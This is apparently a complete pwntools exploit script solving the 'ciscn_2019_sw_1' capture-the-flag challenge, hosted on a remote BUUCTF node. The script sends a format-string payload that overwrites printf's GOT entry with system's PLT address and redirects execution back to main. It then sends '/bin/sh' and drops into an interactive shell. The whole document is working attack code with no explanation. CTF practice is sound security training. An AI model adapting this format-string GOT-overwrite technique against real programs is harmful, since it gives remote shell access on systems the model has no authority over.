from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_2019_sw_1')
p = remote('node4.buuoj.cn', 29739)
elf = ELF('ciscn_2019_sw_1')

printf_got = elf.got['printf']
system_plt = elf.plt['system']
main = elf.sym['main']

#gdb.attach(p, 'b *0x80485a8')

payload = b'%2052c%13$hn%31692c%14$hn%356c%15$hn' + p32(printf_got + 2) + p32(printf_got) + p32(0x804979c) 

p.sendlineafter(b'name?\n', payload)

p.sendlineafter(b'name?\n', '/bin/sh\x00')

p.interactive()